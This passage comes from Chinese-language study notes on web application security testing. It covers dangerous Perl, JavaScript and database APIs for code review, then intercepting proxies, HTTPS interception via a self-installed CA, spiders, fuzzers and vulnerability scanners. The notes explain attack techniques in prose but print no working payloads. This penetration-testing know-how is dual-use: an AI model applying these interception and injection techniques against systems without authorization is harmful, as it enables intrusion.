<p>更搞笑的是，某些数据的处理并不能添加转义，因此如果开启了 magic quotes 选项，则开发者还需要在源代码中，删除 PHP 添加的转义符，从而对请求参数做出一些原本并不需要的修改，导致出现混乱；</p>
<p>通常建议关闭该选项，因为它是针对所有请求参数的，太没有针对性了，很容易引入更多的麻烦。更好的做法是使用预处理语句，来安全的访问数据库；</p>
<blockquote>
<p>PHP 6 以上版本已经删除了该选项；</p>
</blockquote>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210429084953.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><p>Perl 是一种非常灵活的语言，同一个任务，有很多种写法，这也意味着漏洞的敞口很大，尤其是在自主开发的模块中，部分没有经验的开发者有可能在其中引入一些危险的函数来执行任务。Perl Web 程序通常使用 CGI.pm 模块来构造（后面的内容围绕该模块展开，如果不是使用该模块，则相关功能的 API 需要另外查文档确定；</p>
<h3 id="获取用户提交的数据-3"><a href="#获取用户提交的数据-3" class="headerlink" title="获取用户提交的数据"></a>获取用户提交的数据</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430072702.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="会话交互-3"><a href="#会话交互-3" class="headerlink" title="会话交互"></a>会话交互</h3><p>Perl 使用 CGISession.pm 模块来实现会话管理，写法如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430073115.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="潜在的危险-API-3"><a href="#潜在的危险-API-3" class="headerlink" title="潜在的危险 API"></a>潜在的危险 API</h3><h4 id="文件访问-3"><a href="#文件访问-3" class="headerlink" title="文件访问"></a>文件访问</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430073257.png" srcset="/img/loading.gif" lazyload></p>
<p>open 接受文件名参数，实现向指定文件写入或读取内容，因此如果用户可以控制文件名参数，则攻击者可以利用它来访问任意文件；更狠的是， open 还允许在参数中使用管道连接符 “|”，如果参数中包含管道符，则参数内容将被发送给 shell，因此攻击者可以利用它来执行任意的操作系统命令；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430073626.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="数据库查询"><a href="#数据库查询" class="headerlink" title="数据库查询"></a>数据库查询</h4><ul>
<li>selectall_arrayref</li>
<li>do</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430075150.png" srcset="/img/loading.gif" lazyload></p>
<p>较安全的做法是使用包含占位符的语句，通过下面两个函数来实现：</p>
<ul>
<li>prepare</li>
<li>execute</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430075304.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="动态代码-2"><a href="#动态代码-2" class="headerlink" title="动态代码"></a>动态代码</h4><p>Perl 也使用 eval 函数来执行动态代码，同时使用分号作为分隔符，连接多个语句；</p>
<h4 id="OS-命令执行-3"><a href="#OS-命令执行-3" class="headerlink" title="OS 命令执行"></a>OS 命令执行</h4><ul>
<li>system</li>
<li>exec</li>
<li>qx</li>
<li>反单引号 `</li>
</ul>
<p>以上函数都接受管道符，因此攻击者可以利用以上函数，执行任意的操作系统命令；</p>
<h4 id="重定向-3"><a href="#重定向-3" class="headerlink" title="重定向"></a>重定向</h4><ul>
<li>redirect：其参数可以是相对 URL，也可以是绝对 URL 的字符串；</li>
</ul>
<h4 id="套接字-3"><a href="#套接字-3" class="headerlink" title="套接字"></a>套接字</h4><ul>
<li>socket：创建套接字</li>
<li>connect：建立连接</li>
</ul>
<h3 id="配置-Perl-环境"><a href="#配置-Perl-环境" class="headerlink" title="配置 Perl 环境"></a>配置 Perl 环境</h3><p>相对于 PHP 使用安全模式，Perl 比较有意思，它使用污染模式，即默认用户的输入都是被污染和不安全的，如果有任意变量是基于用户的输入来赋值，那么该变量也会视为被污染的变量；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430075936.png" srcset="/img/loading.gif" lazyload></p>
<p>污染的变量无法作为一些标记为敏感函数的参数，如 eval、system、exec、open 等，需要使用正则表达式对污染变量进行净化后，才可以使用，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430080059.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>Perl 的污染模式相当于要求开发者强制对输入进行过滤，从某种程度来说，确实提高了开发者的安全意识；</p>
</blockquote>
<p>虽然污染模式的初衷是很好的，但是它的安全防御效果，还取决于开发者能否写出正确有效的正则表达式，如果不行的话，仍然是存在漏洞隐患的；</p>
<h2 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h2><p>前端的 JS 代码无须任何权限，即可被用户查看。查看这部分代码有助于了解前端实施了哪些输入检查机制，以及动态生成的页面结构；有两个位置存在 JS 代码，一个是 js 文件，另外一个是嵌入在 HTML 中的 JS 代码；</p>
<p>主要的检查点为 DOM 操作以及对当前文档进行修改的 API；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430080645.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="数据库组件"><a href="#数据库组件" class="headerlink" title="数据库组件"></a>数据库组件</h2><p>由于数据库软件变得越来越强大，因此它的功能已经不再局限于存储数据，而是围绕存储目标，进行了强大的扩展和增强，因此也经常被用于执行一定程度的业务逻辑。这些扩展的功能包括：存储过程、触发器、自定义函数等；因此，在审查源代码时，也有必要同时审查写在数据库组件中的代码；</p>
<p>数据库组件的安全隐患，从本质上来说，跟其他语言并没有区别，只是语法稍有不同而已，常见的漏洞仍然为下面两类：</p>
<ul>
<li>存在 SQL 注入漏洞；</li>
<li>使用用户参数，调用敏感函数</li>
</ul>
<h3 id="SQL-注入-1"><a href="#SQL-注入-1" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>除了在业务源代码层面排除注入隐患外，还需要检查存储过程，因为有些隐患发生在这些地方，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430081547.png" srcset="/img/loading.gif" lazyload></p>
<p>不同的数据库软件，其动态执行 SQL 语句的命令不同，常见数据库及其命令名称如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430081643.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="调用危险的函数"><a href="#调用危险的函数" class="headerlink" title="调用危险的函数"></a>调用危险的函数</h3><p>数据库本质上是一个软件，运行的时候，它自己即是一个进程，因此它具有所有进程都会拥有的功能，可以在权限范围内执行任意的系统命令。为了增强数据库本身的功能，它开放了一部分接口供开发者在存储过程中调用，这在带来方便的同时，也引入了安全隐患；攻击者可以利用它来执行任意的操作系统命令；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430083707.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="代码浏览工具"><a href="#代码浏览工具" class="headerlink" title="代码浏览工具"></a>代码浏览工具</h2><p>为了完成源代码的审查，不可避免需要实现大量搜索、跳转等动作，因此，使用一个支持多种语言的源码浏览软件，会提高很多效率，常见的有 Visual Studio、NetBeans 和 Eclipse 等。作者在此处推荐了一个以前没听说的，叫 Source Insight，估计是专门针对这个场景进行开发和优化的；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210430084420.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="20-Web-应用程序工具包"><a href="#20-Web-应用程序工具包" class="headerlink" title="20. Web 应用程序工具包"></a>20. Web 应用程序工具包</h1><p>理论上只需要一个浏览器就可以发起 Web 攻击，不过这样做显示效率不高，因为浏览器毕竟是作为普通用户浏览 Web 网站的场景而开发的，因此更高效的做法是开发额外的工具，将它放在浏览器和目标应用程序之间，拦截浏览器和应用程序之间的请求和响应，根据需要修改请求和读取响应，实现预期的目标。</p>
<p>第二类工具是基于常见的漏洞特征，自动对目标应用程序进行扫描，寻找是否存在潜在的漏洞。第三类工具是针对某种特定的漏洞执行特定的任务，这类工具使用的频率比较低，但由于它是针对性开发，因此在针对特定问题上，其效果非常好。</p>
<h2 id="Web-浏览器"><a href="#Web-浏览器" class="headerlink" title="Web 浏览器"></a>Web 浏览器</h2><p>不的浏览器厂家，其开发的浏览器功能和配置有所不同，因此在使用它们进行攻击时，需要了解并利用它们不同的特性，来提高攻击的效率；</p>
<h3 id="Internet-Explorer"><a href="#Internet-Explorer" class="headerlink" title="Internet Explorer"></a>Internet Explorer</h3><p>虽然 IE 浏览器已经非常古老了，但令人遗憾的是，目前它仍然在世界上占据一定的市场份额，它只能运行在 Windows 平台上，而且也只有它支持 ActiveX 控件。</p>
<blockquote>
<p>截止 2021-5-1，网上查到的各浏览器市场份额如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501081455.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501081508.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<blockquote>
<p>IE 8 引入了反 XSS 功能，并且默认开启，因此在探查 XSS 漏洞时，需要先将其关闭。待找到漏洞后，再将其打开，如果需要，可进一步规避该漏洞的办法；</p>
</blockquote>
<p>以下两个 IE 扩展可协助攻击 Web 应用程序：</p>
<ul>
<li>HttpWatch：用于分析所有的 HTTP 请求和响应；</li>
<li>IEWatch：功能与 HttpWatch 类似，另外还可用于分析 HTTP 文档、图像和脚本等；</li>
</ul>
<h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><p>由于每个浏览器的特性不同，因此针对 IE 无效的 XSS 攻击，可能在 Firefox 有效。以下是常见的攻击辅助扩展：</p>
<ul>
<li>HttpWatch：同样可用于 Firefox</li>
<li>FoxyProxy：设置浏览器的代理，可快速切换代理，并为不同的 URL 设置不同的代理；</li>
<li>LiveHTTPHeader：修改消息头；</li>
<li>PrefBar：启用禁用 cookie、检查访问控制、切换代理、清除缓存；</li>
<li>Wappalyzer：确定页面技术栈；</li>
<li>WebDeveloper 工具栏：查看所有页面链接、更改页面 HTML、取消表单长度限制、显示隐藏的表单字段、修改请求方法；</li>
</ul>
<h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><ul>
<li>XSS Rays：XSS 漏洞和 DOM 漏洞测试；</li>
<li>cookie 编辑器</li>
<li>Wappalyzer</li>
<li>WebDeveloper</li>
</ul>
<h2 id="测试集成工具"><a href="#测试集成工具" class="headerlink" title="测试集成工具"></a>测试集成工具</h2><p>早期的工具是 Achilles，虽然功能简单，但有经验的攻击者可用它实现攻击。当前各常用工具如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501084142.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>每种套件的侧重点有所不同，建议多尝试几种，再从中选择一两个合适的；</p>
</blockquote>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>各个套件的原理大同小异，它内部一般由多个功能模块组成，不同的模块共享相同的请求和响应数据；它会拦截监控浏览器的请求和响应，并保存与应用程序相关的信息，并配套各种不同的功能对这些信息进行读取或修改；其核心组件一般包括：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210501084727.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h4><p>代理拦截是各集成测试软件的核心功能。为了实现拦截，需要先配置浏览器中的代理服务器选项，让浏览器与指定的本地端口发生通信；之后浏览器所有的请求都会发往该端口（实质上该端口即是操作系统为套件分配的端口，当浏览器向该端口发送请求时，请求的数据将由操作系统转发给套件进程进行处理，之后套件转发请求到因特网，并在收到应用程序的响应后，再根据需要转发给浏览器）；</p>
<h5 id="配置浏览器"><a href="#配置浏览器" class="headerlink" title="配置浏览器"></a>配置浏览器</h5><p>大多数浏览器都有使用代理服务的选项，只要按照文档，简单的设置一下就搞定了。</p>
<blockquote>
<p>有些应用程序使用厚客户端，并不在浏览器中运行，而是由客户端直接访问硬编码的域名，因此常规的浏览器代理设置行不通。针对这种情况，有一个简单的解决办法是修改操作系统的 hosts 文件，它在操作系统层面，将指定域名解析到指定的 IP 地址；</p>
<p>虽然修改 hosts 可以解析域名问题，但是端口指定不了，因此接下来还需要配置攻击套件监听 80 和 443 端口，并让端口支持匿名代理功能（开启匿名代理后，发往该端口的非代理请求，将强制被重定向）；</p>
<p>为了避免代理 HTTPS 请求遇到 SSL 证书错误的问题，还需要将匿名代理服务器配置为特定域名的 SSL 证书；</p>
<p>配置套件选项，让其将特定主机名解析为其原始的 IP 地址，以覆盖本地主机的 DNS 解析，使其转发出的请求能够被发送正确的目标服务器（不然会被主机的 hosts 设置再转发回给自己）；</p>
<p>攻击套件需要用到请求中的 Host 字段，来实现转发功能。如果请求中没有 Host 字段，就需要手工预设了。如果应用程序只一个目标主机名还好说，如果有多个，就有点蛋疼了。此时需要在多个机器上运行多个套件实例，来模拟不同的远程主机名；每个实例负责转发一个特定的主机名；</p>
</blockquote>
<h5 id="拦截代理服务器与-HTTPS"><a href="#拦截代理服务器与-HTTPS" class="headerlink" title="拦截代理服务器与 HTTPS"></a>拦截代理服务器与 HTTPS</h5><blockquote>
<p> 当开启浏览器中的代理选项后，浏览器发出的请求跟普通请求略有不同，据说是代理格式的请求，之后需要由拦截器转换成非代理的请求，再发送给目标服务器；好奇代理格式的请求的不同点在哪些</p>
</blockquote>
<p>对于 HTTPS 连接，普通的代理服务器将通过建立和保持 connect 连接，来扮演请求中继的功能，浏览器将直接和目标服务器建立 SSL 握手，这意味着代理服务器并无法知道通过 HTTPS 加密传输的内容。因此，拦截服务器并不能以中继的模式工作，不然无法起到拦截的作用。而是要扮演中间商的作用，分别与浏览器和目标服务器建立两个独立的 SSL 握手，浏览器与目标服务器之间则不发生直接的接触；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210507072807.png" srcset="/img/loading.gif" lazyload></p>
<p>当通过浏览器向目标域名发起请求，收到的却是拦截器提供的 SSL 证书时，浏览器会出现警告弹窗，询问用户是否信任该证书，由于攻击者即是用户本人，因此攻击者可以完全控制浏览器并点击接受。</p>
<p>但接下来会遇到一个问题，目标服务器返回的响应内容中，很有可能携带指向第三方域名的链接，例如引用图片、视频等，而这些第三方域名很可能也是使用 HTTPS 进行访问的；当浏览器向这些第三方域名发起请求时，收到的却是拦截器提供的证书，此时浏览器很可能不再会出现弹窗，询问用户是否接受，而是直接丢弃该请求，并显示一条警告。</p>
<p>另外，当不使用浏览器，而是使用厚客户端向目标服务器发起请求时，厚客户端也很有可能不会相信拦截器的 SSL 证书。</p>
<p>要解决以上问题，关键是要回到问题的原点，即了解一个证书能否被信任，它的过程是怎样发生的。事实上，出于安全和实用的考虑，每个操作系统在出厂的时候，都预安装了一些第三方 CA 机构的根证书。之后各种 SSL 的校验，其实都是通过证书链，最终推导到这些根证书来进行验证的。因此，只要在操作系统中，将自己生成的证书，添加成可信用的 CA 机构，那么由该证书签名的其他证书，就会变成可信的了；</p>
<h5 id="共同特性"><a href="#共同特性" class="headerlink" title="共同特性"></a>共同特性</h5><p>围绕拦截这个基本功能，集成工具一般还配备了高效的辅助工具包，包括：</p>
<ul>
<li>详细的拦截规则：通过设置规则，只拦截满足规则的请求或响应，提高测试效率；</li>
<li>完整的请求和响应记录：可根据需要，将记录转发给其他模块进一步分析处理；并可检索过滤满足特定条件的记录，快速定位；</li>
<li>对请求和响应进行自动匹配和替换：例如自动修改某个参数，修改 cookie 值，删除缓存、修改消息头等；</li>
<li>修改 HTTP 消息格式：例如切换不同的内容编码；</li>
<li>修改 HTML：如显示隐藏表单字段、删除输入限制、删除 JS 检查；</li>
</ul>
<h4 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h4><p>相对于静态页面爬虫，Web 应用程序的爬虫要复杂一点，因为它要处理很多动态生成的东西，并且功能之间经常有顺序要求。使用爬虫的目的在于获取所有关于目标应用程序的功能和内容，以便为下一步的分析做好准备。配合手工浏览，爬虫可以协助发现更多的内容，并将内容获取过程自动化，提高效率，实现彻底搜索；</p>
<p>常用功能如下：</p>
<ul>
<li>自动构建网站地图；</li>
<li>精准爬取指定内容：通过设置规则，准确抓取某一部分指定的内容；避免抓取一些无关的内容，或者访问一些敏感功能，导致出现不可逆的破坏，或者会话终止；</li>
<li>自动解析内容：如 HTML 表单、脚本、注释、图像等，之后可在站点地图中便捷的分析它们；</li>
<li>解析 JS 代码，从中发现动态的 URL 和资源；</li>
<li>根据预设置参数，自动提交表单；</li>
<li>自定义无效资源的规则，让网站地图的构建更加精准（因为有些服务器即使请求的资源无效，也会返回  200 状态）；</li>
<li>通过检查 robots 文件来发现隐藏的资源；</li>
<li>根据枚举的目录，自动抓取里面的内容（即使这些内容链接并没有出现在响应中）；</li>
<li>自动获取和使用 cookie；</li>
<li>自动测试每个页面的 cookie  依赖性；</li>
<li>自动设置正确的 Referer 消息头（因为有些服务端会使用该消息头判断请求是否由人而非机器发起）；</li>
<li>可自定义任意的消息头；</li>
<li>控制自动抓取的速度和顺序，避免请求过快导致服务器崩溃，并让抓取的行为更加隐蔽；</li>
</ul>
<h4 id="测试器"><a href="#测试器" class="headerlink" title="测试器"></a>测试器</h4><p>自动化工具可以提高测试的效率，集成工具通常包含如下常用的功能：</p>
<ul>
<li>常见漏洞扫描的自定义配置；</li>
<li>内置攻击荷载和自定义函数，可根据自定义选项，自动生成任意的有效荷载；</li>
<li>保存扫描数据，可用于生成报告，也可传递给其他模块使用；</li>
<li>可自定义响应查看条件，例如根据表达式，筛选出满足条件的响应；</li>
<li>从响应中提取有用的数据，例如提取用户名和密码，供后续其他攻击使用；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210508083154.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h4><p>扫描器一般包含两类扫描功能：</p>
<ul>
<li>被动扫描：监控浏览器的请求和响应内容，分析是否存在常见的漏洞，如明文密码、cookie 配置错误、跨域 Referer 泄露等；</li>
<li>主动扫描：向目标程序发起攻击荷载，探查潜在漏洞，例如跨站点脚本漏洞、HTTP 消息头注入、文件遍历漏洞等；此类扫描对应用程序有一定的破坏性，可能引起应用程序故障；</li>
</ul>
<p>扫描器的使用方法：</p>
<ul>
<li>在手动解析应用程序的内容后，从生成的站点地图中选择感兴趣的部分，然后用扫描器对其进行扫描，这样可以提高效率，了解关键区域存在漏洞的可能性；</li>
<li>当手动测试单个请求时，可以配合扫描器一起使用。通过扫描器检查该请求是否存在常见漏洞；</li>
<li>在通过爬虫抓取整个程序后，使用扫描器扫描所有内容，类似独立的 Web 扫描器；</li>
<li>在浏览目标程序时，可以 Burp Suite 中开启实时扫描功能。这样借助浏览动作，将需要扫描的请求，实时的发给扫描器，而不必再额外手动进行配置；</li>
</ul>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210508085054.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>虽然集成工具的扫描器的设计用途与独立扫描器不同，但事实上它的核心功能很强大，能够完成更多事情；</p>
</blockquote>
<h4 id="手动请求工具"><a href="#手动请求工具" class="headerlink" title="手动请求工具"></a>手动请求工具</h4><p>当需要对某个资源或接口进行深入探查时，我们一般会切换到手动的模式，此时需要对同一个资源或接口重复发布请求，但每个请求之间的内容有所区别。此时就会需要用到手动请求工具，来提高效率</p>
<blockquote>
<p>这方面也有一些独立的工具，例如 Netcat，但一般集成套件也会有集成；集成后更加方便，当使用其模块进行初步探查中，再从中挑选感兴趣的部分，进一步进行深入的探查；探查的过程中，还可以利用其他模块共享的一些功能，例如 HTML 呈现、下游代理、验证、自定义消息头等；</p>
</blockquote>
<p>手动请求的常用功能：</p>
<ul>
<li>与其他模块配合，相互传递请求和数据；</li>
<li>保存所有请求和响应的历史记录，方便进入深入分析；</li>
<li>支持选项卡展示，可一次性处理多个不同的请求；</li>
<li>自动跟踪重定向；</li>
</ul>
<h4 id="会话令牌分析器"><a href="#会话令牌分析器" class="headerlink" title="会话令牌分析器"></a>会话令牌分析器</h4><p>会话令牌理想状态下应该是随机生成的，但是有些 Web 应用程序并没有做到这点。会话令牌分析器（Burp 中的 Sequencer）会基于样本对随机程度进行判断；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210509082954.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="共享功能与实用工具"><a href="#共享功能与实用工具" class="headerlink" title="共享功能与实用工具"></a>共享功能与实用工具</h4><ul>
<li>自动解析 HTTP 消息结构，例如消息头、请求参数等；</li>
<li>自动解析各种序列化的数据；</li>
<li>自动渲染 HTML 内容，就像在浏览器中查看一样；</li>
<li>支持以文本和十六进制格式编辑和显示消息；</li>
<li>支持对请求和响应内容的搜索；</li>
<li>编辑请求后，自动更新 Content-Length 属性；</li>
<li>内置编码器和解码器，可对请求和响应中的内容进行自动化解码或编码；</li>
<li>自动比对两个响应之间的不同之处，并突出显示；</li>
<li>自动化分析和发现易攻击面；</li>
<li>支持持久化保存会话数据；</li>
<li>支持下游代理和 SOCKS 代理；</li>
<li>内置 HTTP 验证方法；</li>
<li>支持客户端的 SSL 证书；</li>
<li>支持更深入的处理 HTTP 属性，例如 gzip 内容编码、块传输编码、状态码等；</li>
<li>支持使用第三方的插件对内置功能进行扩展；</li>
<li>常规任务自动化，例如自动爬取、扫描等；</li>
<li>支持持久化保存选项配置；</li>
<li>平台独立性；</li>
</ul>
<h3 id="测试工作流程"><a href="#测试工作流程" class="headerlink" title="测试工作流程"></a>测试工作流程</h3><p>典型的测试工作流程如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210509084554.png" srcset="/img/loading.gif" lazyload></p>
<p> 基本思路：</p>
<ul>
<li>先解析应用程序的所有功能和请求，形成访问的历史记录和站点地图；</li>
<li>从历史记录或站点地图中，挑选最有可能存在漏洞的功能，发送给特定的模块，进行测试；例如将输入功能发给模糊测试、将令牌发给令牌分析器、使用 Repeater 对某个资源重复发送请求，检查漏洞是否存在等；</li>
<li>找到漏洞后，再回到浏览器检查漏洞是否被触发了，例如跨站点脚本是否注入成功，并会在浏览器触发执行等、SQL 注入成功，浏览器是否显示 SQL 的查询结果等；</li>
</ul>
<blockquote>
<p>测试人员不应该局限于上面的基本思路，可以发挥创意，尝试更多的测试办法，各种模块的组合，甚至还可以引入新的测试工具；</p>
</blockquote>
<h3 id="拦截代理服务器替代工具"><a href="#拦截代理服务器替代工具" class="headerlink" title="拦截代理服务器替代工具"></a>拦截代理服务器替代工具</h3><p>使用拦截代理服务器会导致浏览器和目标应用程序之间的通信被中断，有时候这种中断会导致部分应用程序的功能不可用，导致测试无法进行。此时只能去掉代理服务器，直接使用浏览器跟服务器进行通信，但是通过安装浏览器扩展，我们仍然能够完全控制浏览器发出的任意请求。</p>
<blockquote>
<p>虽然扩展可以控制任意的请求，但是它的缺点是只能手动操作，可能也缺少自动抓取、模糊测试、漏洞扫描等功能；当然，如果可以的话，自己编写浏览器扩展是可以解决以上问题；</p>
</blockquote>
<p>常用的浏览器扩展示例如下，测试员应该多多搜索和试用，并挑选最合适的工具：</p>
<h4 id="Tamper-Data"><a href="#Tamper-Data" class="headerlink" title="Tamper Data"></a>Tamper Data</h4><p>Firefox 扩展，当浏览器尝试提交表单时，它会进行拦截，并跳出弹窗，显示发送的报头和参数，可根据需要进行修改；</p>
<h4 id="TamperIE"><a href="#TamperIE" class="headerlink" title="TamperIE"></a>TamperIE</h4><p>Tamper Data 的 IE 版本，功能相同；</p>
<h2 id="独立漏洞扫描器"><a href="#独立漏洞扫描器" class="headerlink" title="独立漏洞扫描器"></a>独立漏洞扫描器</h2><p>独立漏洞扫描器的好处在于可以快速发现应用程序是否存在常用的漏洞。在收集完应用程序的功能和站点地图后，扫描就会针对各个功能发起各种攻击请求，并自动分析响应内容，从中查找漏洞存在的关键特征，之后生成一份漏洞报告。</p>
<h3 id="扫描器探测到的漏洞"><a href="#扫描器探测到的漏洞" class="headerlink" title="扫描器探测到的漏洞"></a>扫描器探测到的漏洞</h3><p>有些漏洞有非常明显的特征，通过扫描器可以非常可靠的探测到。有时候，在应用程序的请求和响应中，自带这些特征。当发现这些特征后，扫描器就会有针对性的发送一个攻击荷载，看漏洞是否会被触发，如果会的话，扫描器就会将漏洞记录到报告中；</p>
<p>扫描器可以探测到的常见漏洞有：</p>
<ul>
<li>反射型跨站点脚本漏洞：此时用户提交的输入未被检查或净化，可直接在响应中返回；</li>
<li>SQL 注入漏洞：提交单引号会导致响应返回 ODBC 错误；或者提交特定字符串，会导致响应的时间延迟；</li>
<li>路径遍历漏洞：提交对某个已知文件的请求，然后看响应中是否出现该文件内容；</li>
<li>命令注入漏洞：提交注入导致响应延迟，或者某个特殊内容可以在响应中出现；</li>
<li>目录列表：提交目录请求，从响应中查看是否有目录列表；</li>
<li>明文密码、cookie、开启自动完成表单：直接通过检查请求和响应内容即可初步判断；</li>
<li>信息泄露：提交不同文件扩展名的枚举资源请求，检查是否存在未在链接中公开的文件和数据；</li>
</ul>
<p>不过漏洞扫描器也不是万能的，它也存在很多的局限性，只要开发者对稍加注意，扫描器经常就无法在响应中发现漏洞特征，以下是一些扫描器难以准确判断的漏洞：</p>
<ul>
<li>访问控制漏洞：此类漏洞可导致 A 用户访问 B 用户的数据，甚至是管理员的功能；</li>
<li>参数修改：扫描器无法预知修改某个参数，在逻辑上可能给应用程序带来的影响；</li>
<li>逻辑错误：例如提交负值，破坏计算逻辑；或者省略请求，跳过应用程序的检查步骤；</li>
<li>设计漏洞：例如低安全的密码，可通过枚举猜测；</li>
<li>会话劫持：攻击者通过猜测的会话令牌，假装另外一名用户登录；</li>
<li>敏感信息泄露：用户名列表、日志等；</li>
</ul>
<blockquote>
<p>虽然扫描器很有用，但是不能仅仅依赖它，因为有些漏洞它难以探查出来。在扫描器的基础上，应该多进一步分析；</p>
</blockquote>
<h3 id="扫描器限制"><a href="#扫描器限制" class="headerlink" title="扫描器限制"></a>扫描器限制</h3><p>虽然扫描器是专门研究 Web 应用程序漏洞的专家的所设计，但它仍然不可避免存在一些目前技术难以克服的先天限制，主要原因如下：</p>
<ul>
<li>Web 应用程序不是一种标准的程序，每个 Web 应用程序要解决的问题各不相同，因此写出来的代码千差万别，这也决定了其包含的漏洞形式和位置千差万别；相同的错误代码，却可能包含不同的错误消息，代表不同的含义。扫描器目前还无法像人类一样理解这些消息背后的真正含义，并做出下一步合理的行动。</li>
<li>针对某个应用程序的特殊异常表现，扫描器无法针对该异常做出有创造性的处理，它只能使用写好的既定步骤，完成标准的行为。扫描器只能按既定规则，蛮力提交大量请求。它无法从一堆响应中，找出最佳的攻击办法，例如根据多阶段步骤设计专门的输入、调整请求的顺序、在不同的步骤中传递消息等；</li>
</ul>
<h3 id="扫描器技术挑战"><a href="#扫描器技术挑战" class="headerlink" title="扫描器技术挑战"></a>扫描器技术挑战</h3><ul>
<li>在扫描器自动化运行的过程中，有可能因为提交了某个请求，导致会话退出，此时有些扫描器无法自动重新登录，可能会导致部分漏洞被错过；</li>
<li>危险性：某些提交给应用程序的请求可能需要极大的破坏性，有可能直接导致应用程序崩溃，或者数据库的数据丢失；</li>
<li>扫描器一般将不同的链接理解为不同的内容，但事实上要测试的是功能，同一个功能，可能包含海量的链接，例如购物网站的商品链接，日历应用的日期链接等；</li>
<li>状态化处理：Web 应用程序的一个趋势是越来越多的保留大量状态在客户端，某个功能的完成，需要基于客户端的状态信息来完成；</li>
<li>避开应用程序的防御措施，例如出现异常立即终止会话、CAPTHA、二次验证等；</li>
</ul>
<h3 id="主流产品"><a href="#主流产品" class="headerlink" title="主流产品"></a>主流产品</h3><p>目前市场上主流的漏洞扫描器产品包括：</p>
<ul>
<li>Acunetix</li>
<li>AppScan</li>
<li>Burp Scanner</li>
<li>Hailstorm</li>
<li>NetSparker</li>
<li>N-Stalker</li>
<li>NTOSpider</li>
<li>Skifish</li>
<li>WebInspect</li>
<li>w3af</li>
</ul>
<p>大部分扫描器是收费的，少数是免费的，有趣的是，价格跟性能之间并没有直接关系。价格更高的不一定代表更好，价格低也不意味着性能不好</p>
<h3 id="扫描器使用"><a href="#扫描器使用" class="headerlink" title="扫描器使用"></a>扫描器使用</h3><p>漏洞扫描器的好处是可以在最少的时间内，发现最多的漏洞，但最多一般也不会超过常见漏洞的 50%；这意味着它主要使用在以下场景中：</p>
<ul>
<li>时间紧迫，需要尽快给出结果；</li>
<li>时间不紧迫，可基于该结果做为后续详细探查的参考；</li>
</ul>
<p> 使用时的注意事项：</p>
<ul>
<li>了解扫描器能够发现的漏洞类型，以及它不能够发现的漏洞类型；（知其为，知其不可为）</li>
<li>熟悉扫描器的功能，知道如何进行配置，能够实现有效的扫描；</li>
<li>在扫描之前，先全面了解应用程序，以便更有针对性的利用扫描器的功能；（知已知彼，百战不殆）</li>
<li>了解抓取功能和全自动探查潜在的危险；</li>
<li>手动核实扫描报告中的所有潜在漏洞；</li>
<li>扫描器会在服务器和 IDS 防御中留下大量的“指纹”，如果要保持隐秘，则不要使用扫描器；</li>
</ul>
